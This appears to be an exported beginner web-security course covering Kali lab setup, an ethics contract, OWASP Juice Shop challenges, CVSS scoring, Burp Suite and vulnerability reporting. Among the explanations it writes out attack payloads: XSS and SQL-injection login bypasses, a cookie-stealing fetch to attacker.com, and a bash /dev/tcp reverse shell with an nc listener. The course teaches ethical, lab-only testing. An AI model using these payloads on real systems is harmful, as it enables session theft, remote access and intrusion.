weeks.context:
Security work starts with adversarial thinking. Before you can defend anything, you need to understand how attackers reason: they are looking for the cheapest path to their objective, not the most clever one. That means misconfigurations, unpatched dependencies, weak credentials, and human error are attacked far more often than exotic zero-days.

This week you build that mental model. You learn the attack lifecycle (recon → exploit → persist → exfil), the difference between vulnerability and exploit, and how OWASP Top 10 maps to real breaches. You also set up your lab environment so you have a safe place to practise everything that follows.

The Juice Shop is a deliberately vulnerable Node.js app maintained by OWASP. Every bug in it maps to a real vulnerability class. Finding bugs there is not cheating — it is the point.

days.title: Your Coding Environment — Terminal, VirtualBox / WSL, Kali Lab
days.summary: A safe lab environment for hacking practice. Foundation for every cybersec day.

items.title: What this environment is — and why before anything else
items.body:
## What it is
You **cannot** practice security tools on your everyday laptop's OS. Two reasons:
1. Half the tools you'll run are flagged as malware (correctly — they're attack tools).
2. You need to break things, and breaking your daily-driver is bad.

The answer: a **virtual machine** with a security-focused OS like **Kali Linux**. Inside the VM you can install / break / re-image as much as you want without touching your host.

## What you'll do today
1. Install **VirtualBox** (Windows / Mac / Linux) OR **WSL2 with Kali** (Windows-only, lighter).
2. Download the Kali VM image (or `wsl --install -d kali-linux`).
3. Boot it.
4. Open the terminal inside Kali and run `nmap --version` → confirm output.

items.title: Install Kali Linux in VirtualBox (or WSL2)
items.creator: NetworkChuck / various
items.why: Watch first. You see the VM setup, the Kali boot, and the first command. Then repeat in your own environment.

items.title: See it in action — the exact steps, with what you should see
items.body:
## Walkthrough
Do every step.

WINDOWS (WSL path, fastest):
1. Open PowerShell as Admin: `wsl --install -d kali-linux`.
2. Reboot. Open 'Kali Linux' from Start.
3. First-run prompts you for a username + password. Set them.
4. `sudo apt update && sudo apt install -y nmap`.
5. `nmap --version`.

MAC / LINUX (VirtualBox path):
1. Install **VirtualBox** from virtualbox.org.
2. Download Kali pre-built VirtualBox VM from kali.org/get-kali.
3. Import into VirtualBox, boot it.
4. Inside the VM: `nmap --version`.

## Verify
PASS:
[x] Kali boots
[x] `nmap --version` prints a version inside Kali

cards.prompt: You should install security tools like nmap directly on your everyday laptop OS.
cards.whenRight: Right — no. Use a VM. Half these tools are flagged by antivirus and you don't want to break your daily-driver.
cards.whenWrong: Use a VM. Daily-driver should stay clean; the VM is your lab.

cards.prompt: WSL2 with Kali is a lighter alternative to a full VirtualBox VM on Windows.
cards.whenRight: Right — WSL2 reuses your kernel, no full hypervisor. Faster boots, less RAM.
cards.whenWrong: Yes — WSL2 is the lightweight option on Windows. VirtualBox is heavier but works everywhere.

cards.prompt: Kali Linux ships with nmap, metasploit and most security tools pre-installed.
cards.whenRight: Right — that's its whole point. A pre-loaded toolkit for security work.
cards.whenWrong: Yes — Kali's the 'batteries included' distro for security work. You install fewer things by hand.

days.title: The ethics contract — non-negotiable
days.summary: Today you sign a contract. You only attack what you own.

items.title: Sign and commit your ethics contract
items.body:
STEP 1 — Make the folder.
      cd Desktop
      mkdir vuln-reports
      cd vuln-reports

STEP 2 — Create ETHICS.md.
  In VS Code, new file ETHICS.md. Type:

      # Ethics Contract
      I, [YOUR FULL NAME], commit to:
      1. Only test systems I own or have explicit written permission to test.
      2. Report any vulnerabilities I find through responsible disclosure channels.
      3. Never exfiltrate or modify user data beyond minimal proof-of-concept.
      4. Document every test for transparency.
      
      Signed: [YOUR NAME]
      Date: [TODAY'S DATE]

  Replace [YOUR FULL NAME] and [TODAY'S DATE]. Save.

STEP 3 — In notes.txt write 3 sentences:
  Why does ethical hacking matter? Why do real security companies require this contract?

items.title: Run OWASP Juice Shop locally
items.body:
STEP 1 — Install Docker Desktop from the card. Open it after install.
  Verify: open a terminal and type:
      docker --version
  YOU SHOULD SEE: 'Docker version 27.x.x' or similar.

STEP 2 — Run Juice Shop.
      docker run --rm -p 3000:3000 bkimminich/juice-shop
  First time this downloads ~200MB. Takes 2-3 minutes.
  YOU SHOULD SEE: lots of logs ending with 'Server listening on port 3000'.

STEP 3 — Open it.
  In your browser: http://localhost:3000
  YOU SHOULD SEE: a fake fruit-juice e-commerce site. This is your practice target for the week.

days.title: Find the Score Board (challenge 1)

items.title: Score Board challenge
items.body:
Your first 'bug': finding the hidden score board page that Juice Shop hides on purpose.

STEP 1 — In the browser at localhost:3000, right-click anywhere → 'View Page Source'.
  Or press Ctrl+U (Cmd+U on Mac).

STEP 2 — Read the HTML. Scroll. Look for anything mentioning 'score-board'.
  HINT: there's a comment near the top.

STEP 3 — Found a hint? Try the URL: http://localhost:3000/#/score-board
  YOU SHOULD SEE: a big page with hundreds of challenge cards. One of them (Score Board) is now lit up green.

STEP 4 — Screenshot.
  Take a screenshot of the green 'Score Board' card.
  Save it in vuln-reports/screenshots/01-scoreboard.png
  (Make the screenshots folder if you don't have it.)

days.title: Find a DOM XSS bug (challenge 2)
days.summary: Cross-site scripting — injecting code into a web page.

items.title: DOM XSS in the search bar
items.body:
Juice Shop's search bar reflects whatever you type into the page WITHOUT properly cleaning it. We exploit that.

STEP 1 — Go to the home page (click the Juice Shop logo).

STEP 2 — In the search bar at the top, type this exactly:
      <iframe src="javascript:alert(`xss`)">
  Press Enter.

STEP 3 — YOU SHOULD SEE: a browser popup that says 'xss'. That's you successfully running JavaScript on the page — XSS achieved.

STEP 4 — Check the score-board page. The 'DOM XSS' challenge is now green.

STEP 5 — Take a screenshot of the alert popup.
  Save as vuln-reports/screenshots/02-domxss.png

days.title: Find broken auth and IDOR (challenges 3 + 4)
days.summary: Two more bugs today: logging in as admin without a password, and viewing someone else's basket.

items.title: Login Admin via SQL injection
items.body:
STEP 1 — Open the login page (top right account icon).

STEP 2 — In the email field, type:
      ' OR 1=1--
  In the password field, type anything (e.g. 'abc').
  Click Log in.

STEP 3 — YOU SHOULD SEE: you are logged in as admin@juice-sh.op.
  Check the top right corner — your account icon shows the admin email.
  The 'Login Admin' challenge is green on the score board.

STEP 4 — Screenshot showing the admin email at top right.
  Save as 03-loginadmin.png

Now challenge 4: View someone else's basket.

STEP 5 — Log out. Register a new normal account (email: test@test.com, any password).
  Add 1 item to your basket. Go to your basket.

STEP 6 — In Chrome DevTools (F12), Network tab. Reload the basket page.
  Find the request to /rest/basket/N (where N is a number, your basket ID).
  Look at the response — that's your basket data.

STEP 7 — Change N. In the URL bar, go to:
  http://localhost:3000/rest/basket/1
  YOU SHOULD SEE: a different user's basket (admin's, in this case). That's IDOR — Insecure Direct Object Reference.

STEP 8 — Screenshot the raw JSON of someone else's basket.
  Save as 04-idor.png

days.title: Find a confidential document (challenge 5)
days.summary: Today: find leaked files the site forgot to protect.

items.title: Hidden /ftp/ path
items.body:
STEP 1 — Try this URL in your browser:
      http://localhost:3000/ftp
  YOU SHOULD SEE: a file listing — Juice Shop accidentally exposes an FTP-style folder.

STEP 2 — Look for a file ending in .md (markdown). Open it.
  You're reading internal company documents that shouldn't be public.
  Find one specifically called 'acquisitions.md' — that's the target file.

STEP 3 — Score Board: 'Confidential Document' challenge is now green.

STEP 4 — Screenshot.
  Save as 05-confidential.png

items.title: Write reports and push
items.body:
STEP 1 — Make a reports/ folder.
      cd Desktop/vuln-reports
      mkdir reports

STEP 2 — Write reports/01-scoreboard.md.
  Use this template for ALL 5 reports:

      # Score Board access via hidden route
      
      **Severity:** Low — informational, but reveals the developer's intent
      **Affected component:** Front-end SPA route `/#/score-board`
      
      ## Steps to reproduce
      1. Navigate to http://localhost:3000
      2. View page source (Ctrl+U)
      3. Find the comment hinting at the route
      4. Navigate to /#/score-board
      
      ## Impact
      Hidden admin/dev pages can leak sensitive information.
      
      ## Suggested fix
      Don't ship hints in comments. Gate the route behind an admin role.
      
      ## Proof
      ![scoreboard](../screenshots/01-scoreboard.png)

STEP 3 — Write the other 4 the same way:
  02-domxss.md (Medium severity — code execution in browser)
  03-loginadmin.md (Critical — full admin compromise via SQLi)
  04-idor.md (High — viewing other users' data)
  05-confidential.md (Medium — leaked internal docs)

STEP 4 — Write README.md.
      # vuln-reports
      My security writeups. Practice begins with OWASP Juice Shop.
      
      ## Ethics
      See ETHICS.md — I only test systems I own or have permission to.
      
      ## Reports
      1. [Score Board access](reports/01-scoreboard.md) — Low
      2. [DOM XSS in search](reports/02-domxss.md) — Medium
      3. [Login Admin via SQLi](reports/03-loginadmin.md) — Critical
      4. [IDOR in /rest/basket](reports/04-idor.md) — High
      5. [Leaked acquisitions doc](reports/05-confidential.md) — Medium

STEP 5 — Push.
  Open the 'create new repository' card. Name: vuln-reports. Public. Create.
      git init
      git add .
      git commit -m "vuln-reports v0.1 — 5 Juice Shop writeups"
      git branch -M main
      git remote add origin https://github.com/YOUR-USERNAME/vuln-reports.git
      git push -u origin main

PASS CRITERIA — Vuln Reports v0.1 ships when:
  ☐ ETHICS.md signed and committed
  ☐ 5 challenges solved with screenshots
  ☐ 5 reports written in the HackerOne template
  ☐ README links each report with severity
  ☐ Public GitHub repo named vuln-reports

mastery_questions: Lockheed Martin's Cyber Kill Chain has seven phases — reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on objectives. Walk through what each phase means using a single real example: an attacker is trying to steal customer data from a small e-commerce site. In recon, they Google the company and find the lead engineer's LinkedIn. In weaponization, they craft a fake billing-dispute PDF with an embedded macro. In delivery, they email it to the engineer from a spoofed customer-support address. Continue the story through all seven phases — what does the macro do when opened, how does the attacker maintain access if the laptop is rebooted, where do they go on the network, what do they exfiltrate and how? The point is not memorising the names. It is that every breach is a sequence, and a defender who breaks any one link in that chain stops the whole attack. Where in this scenario would defences be cheapest and most effective? Hint: it is almost never the exploitation phase. It is almost always the delivery phase — phishing training, attachment filtering, and a culture of 'when in doubt, ask the sender'.

Both SQL injection and XSS happen because the application treats untrusted input as code, but they target completely different layers. SQLi is server-side: the attacker's input gets concatenated into a SQL query that the database executes, so a payload like `' OR 1=1 --` in a login field can bypass authentication entirely by making the SQL evaluate as `WHERE username = '' OR 1=1 --'`. XSS is client-side: the attacker's input gets reflected into a web page and executed by another user's browser, so `<script>fetch('attacker.com/c='+document.cookie)</script>` exfiltrates the session cookie when a victim views the page. SQLi falls under OWASP A03: Injection in the 2021 Top 10. XSS also falls under A03 in the 2021 list (it was its own category, A07, in 2017). What is the single defence that prevents each at the framework level? Parameterised queries for SQLi (the database never sees the input as SQL — it stays a value), and contextual output encoding for XSS (the browser never sees the input as HTML — it stays text). Never trust input. Never inject it as code.

Before you fire up Burp Suite Scanner or sqlmap, spend ten minutes manually exploring the login page — because the bugs that pay are rarely the ones a scanner finds. Test these five things by hand. (1) Submit a username with a single quote: `admin'`. If the error message contains 'SQL syntax', you have found injection without a scanner. (2) Try `admin` / `admin`, `admin` / `password`, `admin` / `admin123`. Default credentials are the number-one way real breaches start. (3) Submit an empty password — some login forms have logic bugs where empty input bypasses validation entirely. (4) Submit username `admin' --` (the SQL comment terminator) with any password. Watch the response. (5) Compare response time for a valid username with a bad password vs a non-existent username with a bad password. If valid usernames take consistently longer, you have a username enumeration bug. Why manual first? Scanners are noisy — they generate hundreds of requests that trigger rate limits and miss the subtle logic bugs a human spots in seconds.

Verizon's annual Data Breach Investigations Report consistently shows that more than 80% of breaches involve credentials, misconfigurations, or human error — not zero-day exploits. Why? Attackers are economic actors. Researching a zero-day costs hundreds of thousands of dollars and burns the moment it is used (the vendor patches it). Phishing an employee for credentials costs almost nothing and works at scale. Finding a public S3 bucket someone forgot to lock down costs nothing. Misconfigurations are everywhere — every cloud account, every server, every dependency — and exploiting them requires zero technical sophistication. What does this mean for a defender? Spend 90% of your security budget on the boring stuff: MFA on every account, automated configuration audits, patching pipelines, employee phishing training, principle of least privilege. The fancy XDR/SIEM/AI-detection stack matters less than getting the basics right. Attackers follow the path of least resistance, and that path is almost never a zero-day.

A CVE (Common Vulnerabilities and Exposures) is an identifier — like CVE-2024-12345 — that gives every publicly-disclosed vulnerability a unique name. CVSS (Common Vulnerability Scoring System) is a 0-10 severity score for that CVE, calculated from how exploitable and impactful the vulnerability is. An exploit is the actual code or technique that takes advantage of the vulnerability. These three are NOT the same thing: a CVE with CVSS 9.8 can be effectively unexploitable in your environment if the affected component is not reachable from the internet, the vulnerable feature is disabled, or a WAF blocks the exploit pattern. Conversely, a CVE with CVSS 4.5 can be catastrophic in your environment if it sits on your authentication service with no compensating controls. CVSS gives you the BASE risk; the environmental scoring is your job. The right way to triage CVEs in production: do not patch by CVSS rank — patch by exposure × exploitability × specific-impact-to-you. A CVSS 5 on your customer-data API is more urgent than a CVSS 9 on an internal tool three people use.
weeks.ai_assist:
**Prompts that work:**
- "Explain SQL injection to me like I have never seen it before, then show me what a vulnerable Node.js query looks like and how to fix it."
- "I found this error message in a web app: [paste error]. What does it tell an attacker about the backend?"
- "What is the OWASP Top 10 A01 Broken Access Control? Give me 3 specific examples of how it manifests in a real app."
- "Help me understand the difference between stored XSS, reflected XSS, and DOM-based XSS. Which is most dangerous and why?"

**What NOT to ask:**
- "Write me an exploit for [real target]" — this is illegal. AI will refuse and you should not be doing it.
- "Is [real website] vulnerable?" — only test what you own or have permission to test.
weeks.pre_flight:
**Lab setup (do this before anything else):**
```bash
# Install Docker if not already
docker run --rm -p 3000:3000 bkimminich/juice-shop
# Open http://localhost:3000 — this is your target all week
```

**Tools to install:**
- Burp Suite Community (free): https://portswigger.net/burp/communitydownload
- Firefox + FoxyProxy extension (for routing through Burp)
- OWASP ZAP as a secondary scanner

**Read first:**
- OWASP Top 10 (2021): https://owasp.org/Top10/
- The Cyber Kill Chain: https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html

**Understand the vocabulary:**
- Vulnerability: a weakness in a system
- Exploit: code or technique that takes advantage of a vulnerability
- Attack surface: every point where an attacker can interact with your system
- Threat model: who wants to attack you, why, and how
common_mistakes: Skipping the recon phase — attackers spend 80% of their time on recon. Jump to exploitation too fast and you miss the real attack surface.
Confusing scanning with hacking — running nmap or nikto at a target is not 'hacking'. It is information gathering. Exploitation is a separate step.
Testing on systems you don't own — always work in a lab (Juice Shop, TryHackMe, HackTheBox). Never test against real sites without written permission.
Treating OWASP Top 10 as a checklist you tick once — it is a risk classification framework. The same app can have multiple A03 injection variants.
Assuming encrypted means secure — HTTPS protects data in transit. It does not prevent XSS, CSRF, SQLi, or broken access control.
weeks.debug_help:
**Can't load Juice Shop?**
```bash
# Check container is running
docker ps
# View logs
docker logs <container_id>
# Port conflict — try different port
docker run --rm -p 3001:3000 bkimminich/juice-shop
```

**Burp Suite not intercepting traffic?**
- Check FoxyProxy is set to 127.0.0.1:8080
- In Burp: Proxy > Options > confirm listener is on 8080
- For HTTPS sites: install Burp CA cert in Firefox (Proxy > Options > Import/Export CA Certificate)

**Found a bug but don't know if it's real?**
- Check the Juice Shop challenge list: http://localhost:3000/#/score-board
- A green challenge = you triggered it correctly
- Read the hints — they explain the vulnerability class

weeks.title: Vuln Reports v0.2: 5 more Juice Shop bugs
weeks.context:
Last week you found your first bugs. This week you go deeper into Juice Shop and find 5 more, but more importantly you learn how to document them. A security finding you cannot communicate clearly is worthless. Bug bounty hunters, pentesters, and security engineers all get paid to write clear, reproducible vulnerability reports.

A good vulnerability report has: title, severity (CVSS score), description, reproduction steps, impact, and remediation. Every step must be exact — if another person cannot reproduce it from your steps alone, the report fails.

You also learn CVSS scoring this week. CVSS v3.1 lets you score a vulnerability's severity from 0 to 10 based on attack vector, complexity, privileges required, and impact. You should be able to score any bug you find from first principles.

mastery_questions: CVSS v3.1 vector strings encode every input that goes into the final score. Walk through writing the vector for a reflected XSS vulnerability that requires user interaction, is network-accessible, and affects confidentiality and integrity but not availability. Start with the prefix `CVSS:3.1/`. Attack Vector is Network (delivered over the web) so `AV:N`. Attack Complexity is Low (no special conditions, just craft the URL) so `AC:L`. Privileges Required is None (anyone can send the link) so `PR:N`. User Interaction is Required (victim has to click) so `UI:R`. Scope is Unchanged (vulnerable and impacted component are the same browser context) so `S:U`. Confidentiality Impact is Low (attacker steals one user's data, not the system's) so `C:L`. Integrity Impact is Low (attacker modifies what one user sees) so `I:L`. Availability Impact is None: `A:N`. Full vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`. Plug it into the NIST calculator — you score about 6.1 (Medium). Could it be higher? Yes: if the XSS lands in an admin panel where it can steal admin tokens, Scope changes to `S:C` and the score jumps to 8.1 (High). The vector forces every assumption to be explicit.

A vulnerability report is 'reproducible' when another competent tester can follow your steps on a clean instance of the target and observe the exact same result. That sounds obvious — but most rejected bug bounty reports fail at this. The common failure modes: (1) The reporter omits a required precondition ('I was logged in as a paid user' — but never said so). (2) The reproduction depends on a specific application state that no longer exists (a stale session token, a temporary file). (3) The reporter pastes a screenshot of the bug but no requests — the triager cannot reproduce without replaying the exact HTTP payload. (4) The reporter describes the bug in prose ('the form is vulnerable') without showing the steps. What happens to a non-reproducible report on HackerOne? It is closed as 'Not Applicable' or 'Informative' — no bounty, no points, and your report-to-bounty ratio (which signals your quality to triagers) drops. Write reproduction steps as if explaining to a junior tester who has never seen the application: include URL, browser, exact payload, expected vs actual response.

Path traversal that lets you read /etc/passwd on a Linux web server means an attacker can read ARBITRARY files the web server process has access to. /etc/passwd itself is not catastrophic on modern systems (no password hashes — those are in /etc/shadow, only readable by root). But the same vulnerability typically lets you read application configuration files (database passwords), private keys (SSH, TLS), source code (revealing more vulnerabilities), and log files (session tokens, user data). The realistic impact is full source-code disclosure plus credential theft, which usually escalates to authenticated access elsewhere. CVSS-wise: Network attack vector (AV:N), Low complexity (AC:L), No privileges needed (PR:N), No user interaction (UI:N), Unchanged scope (S:U), High confidentiality impact (C:H — you read sensitive files), Low integrity impact (I:L — you might read configs that let you escalate), No availability impact (A:N). That scores about 8.6 (High). If the traversal also allows write or if it crosses a trust boundary (S:C), it goes to 9.8 Critical.

Severity and Priority are not the same thing in vulnerability management. Severity describes how bad the vulnerability IS — based on its CVSS score, what it allows an attacker to do, and the impact if exploited. Priority describes how urgently YOU need to fix it — based on exposure to attackers, business criticality of the affected system, available patches, and effort to remediate. A Low severity bug can absolutely have High priority. Example: an information-disclosure bug (CVSS 3.5 — Low) that leaks internal hostnames seems benign. But if it leaks the hostname of your production database server and a public-facing app, that information is the first step in a kill chain to attack the database directly. The bug becomes High priority even though severity is Low. Conversely, a Critical-severity RCE on an internal admin tool used by three people behind a VPN can be Low priority — there is almost no exposure. Triage rule: priority = severity × exposure × business-criticality. Patching by CVSS alone is how teams burn out fixing low-impact 'critical' bugs while real risks sit in the backlog.

Broken Access Control (OWASP A01) covers any flaw where the application fails to enforce 'this user is allowed to do this action on this resource'. It is the #1 category on the 2021 Top 10 because it is everywhere and easy to miss. Three concrete examples, all different from each other: (1) IDOR (Insecure Direct Object Reference) — `GET /api/invoices/1234` returns invoice 1234 to any authenticated user, even if they should only see their own. The fix: server checks that invoice 1234.user_id matches the requester's user_id. (2) Forced browsing — the admin dashboard at `/admin/users` is hidden from the navigation for non-admin users, but typing the URL directly loads it because the route handler does not check the user's role. The fix: every route handler validates the user's role at the top of the function. (3) Missing function-level access control — the API accepts `PATCH /api/users/1234 {role: admin}` from any user, escalating themselves to admin. The fix: role changes can only be made by users who already have the admin role, server-side enforced. Common pattern: every check has to be SERVER-SIDE, every request, every time. Client-side checks are UX, not security.

mastery_questions: Active recon directly interacts with the target — port scans, banner grabs, web crawling — and leaves traces in the target's logs. Passive recon collects information without touching the target: Google searches, LinkedIn profiles, public Github repositories, certificate transparency logs, Shodan results. Two tools for each. Active: `nmap -sV target.com` (port scan with service version detection) and `gobuster dir -u https://target.com -w wordlist.txt` (directory bruteforce). Passive: `theharvester -d target.com -b all` (collects emails, subdomains, employee names from public sources) and `crt.sh?q=target.com` (queries certificate transparency to find subdomains the target may not even know are exposed). Why does it matter which you start with? Passive recon never tips off the target. A real pentest starts with hours of passive recon before any active scan — by the time you scan port 443, you already know the company's tech stack, three subdomain candidates, and the CTO's email address. The active scan just confirms what you already deduced.

A basic web application pentest methodology has six phases. (1) Scoping: what is in scope, what is out, what evidence is required, who gets the report — this is contractual, before any testing. (2) Information gathering: passive recon, technology fingerprinting (Wappalyzer, BuiltWith), subdomain enumeration, certificate transparency, archived versions on web.archive.org. (3) Mapping: spider the application with Burp Suite, identify every endpoint, every parameter, every authentication flow, every role boundary. (4) Vulnerability identification: run scanners on the mapped surface (Burp Scanner, ZAP active scan), then manual testing of business-logic and authorisation. (5) Exploitation: confirm vulnerabilities are real by exploiting them in scope — never beyond what the rules of engagement allow. (6) Reporting: executive summary for leadership, detailed findings with reproduction steps and remediation for engineering. Time allocation in practice: scoping and recon are 25%, mapping is 15%, scanning is 10%, manual testing is 40%, reporting is 10%. The mistake juniors make is spending 70% on scanning. The bugs that pay are in manual testing of business logic.

Gobuster brute-forces paths and subdomains: it takes a wordlist and tries every entry against the target, looking for non-404 responses. Use it when you need to find hidden endpoints — admin panels, backup files, old versions, API routes not in the public navigation. Nikto is a vulnerability scanner: it has a built-in database of known-vulnerable paths and misconfigurations and tells you which ones the target exposes (default credentials on /admin, /phpinfo.php, exposed .git directories, server-version-specific bugs). Use Nikto when you want a quick 'what known issues does this server have' report. They overlap but solve different problems: gobuster finds what is there, nikto identifies what is known-bad. Real workflow: run nikto first to catch the easy wins (Nessus / OpenVAS for paid alternatives), then run gobuster with a focused wordlist for the application's tech stack to find the things scanners do not know about (the developer left `/backup/database.sql.bak` exposed — no scanner has that in its rules, but gobuster with a backup-extension wordlist finds it).

Given a target IP with no other information, your first three commands should be: (1) `nmap -sV -sC -p- -T4 <target>` — full TCP port scan with service version detection and default scripts. The `-p-` scans all 65,535 ports (most scanners default to top 1000 and miss everything else); `-sV` fingerprints service versions; `-sC` runs the default NSE script catalogue against each open port (catches common misconfigurations); `-T4` makes it reasonably fast. (2) `whatweb http://<target>` and `whatweb https://<target>` — identifies the tech stack of any web services found (Apache version, frameworks, CMS, JavaScript libraries). (3) `gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt` — directory brute force with common extensions, finds hidden paths. Why these three? They map the attack surface fast: open ports tell you what services exist, banners tell you exact versions to research for CVEs, directory enum tells you what is hosted that you might not see in the navigation. From those outputs you have hours of follow-up — but you cannot prioritise without first knowing the surface.

A reverse shell is a connection initiated FROM the target machine TO the attacker's machine. It works around inbound firewalls because most firewalls block incoming connections by default but allow outbound connections to anywhere — the target dials out, the firewall happily passes the traffic. Typical setup: attacker runs `nc -lvnp 4444` on a public-facing machine (or uses ngrok), listening on port 4444. Then exploits a vulnerability to make the target execute a command like `bash -i >& /dev/tcp/attacker-ip/4444 0>&1` — this opens a bash shell and redirects stdin/stdout/stderr to a TCP connection to the attacker. Attacker now has an interactive shell with the privileges of whatever process initiated the connection. Why does this defeat firewalls? Most enterprise networks allow outbound HTTP/HTTPS/DNS unconditionally — those become exfiltration channels. The defender's countermeasure: egress filtering (allow outbound connections only to known-good destinations), DNS monitoring (catch beaconing), and EDR that detects shell-spawning patterns regardless of network traffic.

weeks.title: Vuln Reports v0.4: Burp Suite + intercepting requests
weeks.context:
Burp Suite is the primary tool for web application security testing. Every professional pentester uses it daily. This week you learn to use it like a professional — not just as a traffic viewer, but as an active testing platform.

The core Burp workflow: intercept request → modify it → send to Repeater → iterate until you find a vulnerability. The Repeater tab is where most web hacking actually happens. You send a request, tweak a parameter, observe the response, adjust, repeat.

This week you also learn HTTP deeply. Not just GET vs POST — you need to understand headers (Authorization, Cookie, Content-Type, CORS headers), status codes (200/301/302/401/403/404/500), and how the request/response cycle works at the byte level. Burp shows you everything; you need to know what you're looking at.

mastery_questions: IDOR (Insecure Direct Object Reference) is when the application uses a predictable identifier in a request — like an integer user ID or invoice number — without verifying that the requester is authorised to access that object. The classic HTTP request: `GET /api/invoices/1234` returns invoice 1234 to any authenticated user, even if invoice 1234 belongs to a different account. The vulnerable server-side code looks like `Invoice.find_by(id: params[:id])` — it loads the invoice by ID but never checks if the current user owns it. The fixed code: `current_user.invoices.find_by(id: params[:id])` — scopes the query to invoices the user owns. To demonstrate the bug in a Burp request: log in as user A, capture the request for their invoice (say invoice ID 5421), then change the URL to `/api/invoices/5420` and replay. If the response returns user B's invoice data, you have IDOR. IDOR is one of the highest-paying bug categories on HackerOne because it requires zero technical sophistication to exploit (just change a number) but can leak the entire database.

Testing a login form for SQL injection using Burp Repeater, step by step. (1) Submit a normal login attempt with valid-looking credentials (e.g. `test@test.com / Password1`). Burp Proxy captures the request — right-click → 'Send to Repeater'. (2) In Repeater, find the username or password parameter in the request body. Modify the username from `test@test.com` to `test@test.com'` (add a single quote). Click 'Send'. Look at the response. If the response shows a 500 error or contains 'SQL syntax', 'SQLException', or similar — injection is likely. (3) Try the auth bypass payload: change the username to `' OR 1=1 --` and send. If the response is a successful login (redirect to dashboard, session cookie set), the application is vulnerable to authentication bypass via SQLi. (4) Confirm by trying a different payload: `admin' --` — comments out the password check. If you get logged in as admin, confirmed. (5) Document the exact request and response. The vulnerable backend code typically looks like `SELECT * FROM users WHERE email = '$input'` — concatenation. The fix is parameterised queries: `SELECT * FROM users WHERE email = ?` with the value passed separately.

The Cookie header contains all cookies the browser is currently storing for that domain, sent on every request. Format: `Cookie: name1=value1; name2=value2; sessionid=abc123def456`. Session cookies are how the server knows who you are after login — the server gave you a random token at login and trusts every subsequent request bearing that token. Testing if a session token is predictable: (1) Log in, capture the session token from the Cookie header. (2) Log out. Log in again. Capture the new session token. Compare. If the new token differs from the old by a small predictable increment (sequential ID, timestamp, base64 of username), the tokens are predictable. (3) Generate 50 tokens by repeated logins. Run Burp Sequencer on them — Burp analyses entropy and tells you statistically whether the tokens look random. (4) Acceptable session tokens are 128+ bits of entropy from a cryptographic RNG (e.g., Python's `secrets.token_urlsafe(32)`). Predictable tokens let an attacker guess valid session IDs and hijack sessions. Real example: PHPSESSID values that were generated from the timestamp could be brute-forced in seconds.

CORS (Cross-Origin Resource Sharing) is a browser security feature that controls which origins can read responses from a server when a JavaScript request comes from a different origin than the server. A 'no CORS policy' means the server sends no CORS headers — the browser then enforces the Same-Origin Policy by default, blocking cross-origin JavaScript from reading the response. This is SECURE by default — attackers cannot use JS on evil.com to read responses from bank.com. A 'misconfigured CORS policy' means the server sends overly permissive CORS headers, allowing cross-origin access where it should not. The classic misconfiguration: `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true`. This tells the browser 'anyone can read responses from me, with the user's cookies attached'. Now attacker.com can run JavaScript that fetches the victim's private data from bank.com using the victim's session. Equally bad: `Access-Control-Allow-Origin` set to whatever value the request's Origin header contains — effectively allowing any origin. The correct configuration: explicit allow-list of trusted origins, never use wildcard with credentials.

When you intercept a request and see a JWT (JSON Web Token) in the Authorization header, check these three things first. (1) Decode the JWT — paste it into jwt.io. The first part is the header (algorithm), the second is the payload (claims). What user ID is in the payload? What role? What expiration time? If you see `"role": "user"`, it might be possible to modify to `"role": "admin"` if signature validation is weak. (2) Check the algorithm in the header. If it is `"alg": "none"`, the token is unsigned — change the payload, remove the signature, send. Many libraries used to accept this. If it is `"alg": "HS256"` (symmetric) and the server uses a guessable secret, brute-force the secret with hashcat and forge tokens. If it is `"alg": "RS256"` (asymmetric), look for the algorithm confusion attack — swap to HS256 and sign with the public key as the secret. (3) Inspect the expiration. If `exp` is missing or set to far in the future, tokens never expire — a stolen token works forever. The pattern: every JWT-related bug is either weak signing (lets you forge tokens) or weak claims (lets you elevate inside a valid token).

weeks.title: Burp Suite + ZAP — Your Web Testing Workbench
weeks.context:
This week you advance from basic Burp usage to a full web testing workflow. You learn Burp's Scanner (Community has a passive scanner; Pro has active), OWASP ZAP as an open-source alternative, and how to combine automated scanning with manual testing.

Automated scanners find the obvious things fast. Manual testing finds the business logic bugs that scanners miss. A professional web pentest uses both: run the scanner to clear the easy wins, then spend 80% of your time on manual testing of the application's specific functionality.

You also learn OWASP's Web Security Testing Guide (WSTG) this week. It is the definitive manual for web application penetration testing — 12 categories, 91 test cases. You will reference it throughout your career.

days.title: What a web proxy actually is

items.title: Plan before you build
items.body: This week your browser stops talking straight to websites — everything routes THROUGH Burp first, where you can read and rewrite it. Before installing anything, write down what that means: every request your browser sends, and every response it gets back, becomes editable text you control. The whole craft of web testing is built on that one capability. List three things you'd want to change in a request if you could (a price field? a user id? a hidden flag?).

items.title: Burp Suite for beginners (search)
items.creator: various
items.why: Watch someone intercept and modify a single request end to end. You want the workflow — intercept, edit, forward — not a specific creator.

items.title: Burp Suite — Getting started (PortSwigger)
items.why: The official orientation. Read the Proxy and Repeater sections; these are the two tools you'll live in all week.

items.title: Installing Burp's CA certificate (PortSwigger)
items.why: Without trusting Burp's CA, HTTPS sites throw cert errors and you see nothing. This is the step everyone gets stuck on — do it carefully.

items.title: See your own traffic flow through Burp
items.body:
STEP 1 — Install Burp Suite Community Edition (free). Launch it, start a temporary project, use the default configuration.

STEP 2 — Point a browser at Burp's proxy (127.0.0.1:8080). Easiest path: use Burp's built-in browser (Proxy tab → Open Browser), which is pre-configured.

STEP 3 — Install and trust Burp's CA certificate so HTTPS works without warnings (follow the reading).

STEP 4 — In Proxy → HTTP history, browse to a site you OWN or are authorised to test (your own app on localhost, or a deliberately-vulnerable target you're allowed to use).

YOU SHOULD SEE: requests and responses populating the HTTP history table in real time. Click one — you can read the full raw request and response. If history is empty, your browser isn't actually using the proxy.

items.title: Scope is consent
items.body: Before you touch Intercept, set your Target → Scope to ONLY the host you're authorised to test, and tick 'show only in-scope items'. Write one sentence on why: testing anything outside an authorised scope isn't research, it's an offence. Scope is the technical expression of permission. Everything this week happens inside it.

items.title: See why raw HTML insertion is unsafe
items.body: Web testing is largely about what happens when untrusted input reaches a place that trusts it. Toggle escaping on and off in this sandbox and watch the same string switch from harmless text to executing markup. That gap — between data treated as text and data treated as code — is the root of XSS, the bug class you'll hunt with Burp all week.

